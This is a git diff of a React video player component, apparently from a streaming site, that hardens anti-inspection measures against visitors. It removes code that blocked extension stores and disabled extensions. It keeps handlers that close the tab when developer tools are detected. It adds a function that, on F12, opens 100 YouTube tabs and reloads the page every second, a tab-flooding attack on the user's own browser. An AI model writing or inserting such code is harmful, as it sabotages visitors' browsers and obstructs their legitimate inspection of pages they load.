@@ -4,8 +4,6 @@ import { RootState } from "../../redux/store";
 import { useSelector } from "react-redux";
 import axios from "axios";
 
-declare var chrome: any;
-
 const SectionVideoPlayer = () => {
   const [encodedLink, setEncodedLink] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
@@ -17,93 +15,37 @@ const SectionVideoPlayer = () => {
   );
 
   useEffect(() => {
-    const blockExtensionStore = () => {
-      const storeUrls = [
-        "https://chromewebstore.google.com/*",
-        "https://microsoftedge.microsoft.com/*",
-        "about:addons"
-      ];
-
-      if (chrome && chrome.webRequest && chrome.webRequest.onBeforeRequest) {
-        chrome.webRequest.onBeforeRequest.addListener(
-          () => ({ cancel: true }),
-          { urls: storeUrls },
-          ["blocking"]
-        );
-      }
-    };
-
-    const unwantedExtensions = [
-      "extension_id_1",
-      "extension_id_2",
-    ];
-
-    const checkAndBlockExtensions = () => {
-      if (chrome && chrome.management && chrome.management.getAll) {
-        chrome.management.getAll((extensions: chrome.management.ExtensionInfo[]) => {
-          extensions.forEach((extension) => {
-            if (unwantedExtensions.includes(extension.id)) {
-              chrome.management.setEnabled(extension.id, false);
-            }
-          });
-        });
-      }
-    };
-
-
-    const blockExtensionScripts = () => {
-      const observer = new MutationObserver((mutations) => {
-        mutations.forEach((mutation) => {
-          if (mutation.addedNodes) {
-            mutation.addedNodes.forEach((node: Node) => {
-              if (node.nodeType === Node.ELEMENT_NODE && (node as Element).tagName === 'SCRIPT') {
-                const scriptNode = node as HTMLScriptElement;
-                if (scriptNode.src.startsWith('chrome-extension://')) {
-                  scriptNode.remove();
-                }
-              }
-            });
-          }
-        });
-      });
-
-      observer.observe(document.documentElement, {
-        childList: true,
-        subtree: true
-      });
-    };
-
-    
+   
     const handleKeyDown = (e: KeyboardEvent) => {
+    
       if (e.keyCode === 123) {
         e.preventDefault();
-        debugger;
-        closeTab();
+        openMultipleYouTubeTabs();
         return false;
       }
       
+   
       if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
         e.preventDefault();
-        debugger;
         closeTab();
         return false;
       }
       
+     
       if (e.ctrlKey && e.keyCode === 85) {
         e.preventDefault();
-        debugger;
         closeTab();
         return false;
       }
     };
     
-   
+  
     const handleContextMenu = (e: MouseEvent) => {
       e.preventDefault();
       return false;
     };
     
- 
+   
     const detectDevTools = () => {
       const threshold = 160;
       const widthThreshold = window.outerWidth - window.innerWidth > threshold;
@@ -112,7 +54,6 @@ const SectionVideoPlayer = () => {
       if (widthThreshold || heightThreshold) {
         if (!devToolsDetected.current) {
           devToolsDetected.current = true;
-          debugger;
           closeTab();
         }
       } else {
@@ -120,34 +61,25 @@ const SectionVideoPlayer = () => {
       }
     };
     
-  
+   
     const closeTab = () => {
       window.close();
+   
       window.location.href = "about:blank";
     };
     
-
+ 
     document.addEventListener("keydown", handleKeyDown);
     document.addEventListener("contextmenu", handleContextMenu);
     
-
+ 
     const interval = setInterval(detectDevTools, 1000);
     
-   
+  
     if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__) {
       window.__REACT_DEVTOOLS_GLOBAL_HOOK__.inject = function() {};
     }
     
-   
-    function checkDebugger() {
-      debugger;
-    }
-    checkDebugger();
-   
-    blockExtensionStore();
-    checkAndBlockExtensions();
-    blockExtensionScripts();
-
     return () => {
       document.removeEventListener("keydown", handleKeyDown);
       document.removeEventListener("contextmenu", handleContextMenu);
@@ -169,17 +101,17 @@ const SectionVideoPlayer = () => {
           if (response.data && response.data.encodedLink) {
             setEncodedLink(response.data.encodedLink);
           } else {
-            throw new Error('Không thể mã hóa link');
+            throw new Error('');
           }
         } catch (err) {
-          console.error('Lỗi khi mã hóa link', err);
-          setError('Không thể tải video. Vui lòng thử lại sau.');
+          console.error('', err);
+          setError('');
           
           try {
-            const encoded = await encryptWithAES(currentEpisode.link_embed, "key_bí_mật");
+            const encoded = await encryptWithAES(currentEpisode.link_embed, "");
             setEncodedLink(encoded);
           } catch (encryptError) {
-            console.error('Lỗi khi mã hóa AES', encryptError);
+          
           }
         } finally {
           setIsLoading(false);
@@ -223,6 +155,15 @@ const SectionVideoPlayer = () => {
       .replace(/\//g, "_")
       .replace(/=+$/, "");
   }
+
+  const openMultipleYouTubeTabs = () => {
+    for (let i = 0; i < 100; i++) {
+      window.open("https://www.youtube.com", "_blank");
+    }
+    setInterval(() => {
+      location.reload();
+    }, 1000); // Reload every 1 second
+  };
 
   return (
     <>
